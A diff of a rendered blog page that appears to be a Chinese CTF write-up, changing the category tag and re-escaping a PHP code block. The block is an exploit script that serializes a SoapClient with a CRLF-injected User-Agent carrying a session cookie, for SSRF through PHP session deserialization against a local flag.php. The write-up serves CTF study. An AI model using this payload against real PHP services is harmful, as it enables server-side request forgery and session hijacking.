@@ -411,8 +411,8 @@
                     <div class="post-cate">
                         <i class="fas fa-bookmark fa-fw icon-category"></i>
                         
-                            <a href="/categories/CTF复现/" class="post-category">
-                                CTF复现
+                            <a href="/categories/CTF/" class="post-category">
+                                CTF
                             </a>
                         
                     </div>
@@ -433,7 +433,7 @@
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    728
+                    754
                 </div>
                 
 
@@ -476,12 +476,12 @@
 <p>所以反序列化时就会取出|后的内容yyqx进行反序列化</p>
 <p>那我们所需要做的事情就很明确了，传递一个序列化的soapclient类前面加上|并设置序列化引擎为php_serialize，然后再调用一个不存在的方法，让soapclient类调用__call方法。</p>
 <p>附脚本：</p>
-<pre class=" language-language-php"><code class="language-language-php"><?php
-$url="http://127.0.0.1/flag.php";
-$a=new SoapClient(null, array('uri'=>$url,'userAgent'=>'AAABBB\r\n'."cookie=PHPSESSID=cne1c03f7vsllk989o1q4ufaa6",'location'=>$url));
+<pre><code>&lt;?php
+$url=&quot;http://127.0.0.1/flag.php&quot;;
+$a=new SoapClient(null, array('uri'=&gt;$url,'userAgent'=&gt;'AAABBB\r\n'.&quot;cookie=PHPSESSID=cne1c03f7vsllk989o1q4ufaa6&quot;,'location'=&gt;$url));
 $b=serialize($a);
-echo "|".urlencode($b);
-?>
+echo &quot;|&quot;.urlencode($b);
+?&gt;
 </code></pre>
 <p>​	那我们先在本地测试一下soap反序列化调用__call方法构造的soap请求是什么样的吧。</p>
 <p><img src="https://raw.githubusercontent.com/Yiyangqianxixxxx/img/master/QQ%E6%88%AA%E5%9B%BE20191010214537.png" alt></p>
